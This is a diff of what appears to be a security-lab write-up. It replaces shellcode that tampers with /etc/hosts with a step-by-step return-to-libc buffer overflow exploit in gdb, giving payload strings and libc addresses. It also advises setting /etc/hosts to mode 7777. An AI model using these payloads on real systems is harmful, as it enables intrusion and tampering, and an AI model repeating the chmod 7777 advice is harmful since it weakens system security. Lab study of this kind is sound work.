@@ -91,42 +91,91 @@ for i in $(objdump -d run_file.asm |grep "^ " |cut -f2); do echo -n '\x'$i; done
 ![alt text](./image/image-1.png)
 
 
-**We have the shellcode for run_file file as follows:**
-```
-    \x31\xc9\xf7\xe1\xb0\x05\x51\x68\x6f\x73\x74\x73\x68\x2f\x2f\x2f\x68\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\x01\x04\xcd\x80\x93\x6a\x04\x58\xeb\x10\x59\x6a\x14\x5a\xcd\x80\x6a\x06\x58\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xeb\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65
-```
+We can use return-to-libc to solve the problem
 
-**Stack Frame:**
-
-![alt text](./image/image-2.png)
-
-payload = padding + returnaddress + shellcode
-        = 20 bytes + returnaddress(exit of asm file) + shellcode 
-
-Here, we will use the vuln.c program to trigger a buffer overflow
-
-GDB 
-
-run with this command
+Đặt biến môi trường 
 
 ```
-    run $(python -c "print( '\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x6f\x73\x74\x73\x68\x2f\x2f\x2f\x68\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\x01\x04\xcd\x80\x93\x6a\x04\x58\xeb\x10\x59\x6a\x14\x5a\xcd\x80\x6a\x06\x58\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xeb\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\xff\x67\x6f\x6f\x67\x6c\x65' + 'x94\x80\x04\x08' + '\xa8\xd6\xff\xff')")
+export MYBUF="/home/seed/seclabs/buf/Security-labs/software/buffer-overflow/run_file"
+
 ```
 
-set *0xffffd6 = 0x08048094
-set {unsigned char} 0xffffd6eb = 0x20
-set *0xffffd6eb = 0x20
-set *0xffffd6e5 = 0xffffd688
-![alt text](./image/image-3.png)
 
-Buffer Size: The buffer is 16 bytes.
+Xem lại biến môi trường bằng câu lệnh
 
-Return Address: You need to overwrite the return address after the buffer. Assuming standard stack layout:
+```
+env | grep MYBUF
+```
 
-Offset = Buffer Size + 4 (for EBP) = 16 + 4 = 20 bytes.
+Connect gdb to find the address of system, exit and the value "/home/seed/seclabs/buf/Security-labs/software/buffer-overflow/run_file"
+
+After run the program by in gdb:
+
+```r``` 
+
+find the address by this command step by step
+```
+p system
+p exit
+find /home/seed/seclabs/buf/Security-labs/software/buffer-overflow/run_file
+```
+
+![alt text](image.png)
+
+system: 0xf7e50db0
+exit: 0xf7e449e0
+/home/seed/seclabs/buf/Security-labs/software/buffer-overflow/run_file: 0xffffd933
 
 
-**Conclusion**: comment text about the screenshot or simply answered text for the question
+Stackframe 
+![alt text](./image/image-4.png)
+
+
+Using the stack frame, we can calculate the payload to write:
+
+`padding (20 bytes) + address of system + address of exit + address of MYBUF’s value (/home/seed/seclabs/buf/Security-labs/software/buffer-overflow/run_file)`
+
+this command must to be: 
+
+```
+run $(python -c "print('a'*20 + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' + '\x33\xd9\xff\xff')")
+```
+
+exit gdb and connecting again
+
+Run program by the command:
+
+```
+run $(python -c "print('a'*20 + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' + '\x33\xd9\xff\xff')")
+```
+Check /etc/hosts folder by:
+```
+sudo cat /etc/hosts
+```
+![alt text](./image/image-5.png)
+
+Why isn’t Google.com’s address listed here?
+
+
+We need to configure permissions for the `/etc/hosts file.`
+
+Set permissions by the command:
+```
+sudo chmod 7777 /etc/hosts
+```
+- sudo: Runs the command as superuser (root).
+- chmod 7777: Gives read, write, execute permissions to everyone, plus SUID, SGID, and sticky bit.
+- /etc/hosts: A critical system file that maps hostnames to IP addresses.
+
+Connect gdb and run program again:
+![alt text](./image/image-6.png)
+
+Check folder /etc/hosts again
+
+![alt text](./image/image-7.png)
+
+Successfully!
+
 
 # Task 2: Attack on the database of Vulnerable App from SQLi lab 
 - Start docker container from SQLi. 
